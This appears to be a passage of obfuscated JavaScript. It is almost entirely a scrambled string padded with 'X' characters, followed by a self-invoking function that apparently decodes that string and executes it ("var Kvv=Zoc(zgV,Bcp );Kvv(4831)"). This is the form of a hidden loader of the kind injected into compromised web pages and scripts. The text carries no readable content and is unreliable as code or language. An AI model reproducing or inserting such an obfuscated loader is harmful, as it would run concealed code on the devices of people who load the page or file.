wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
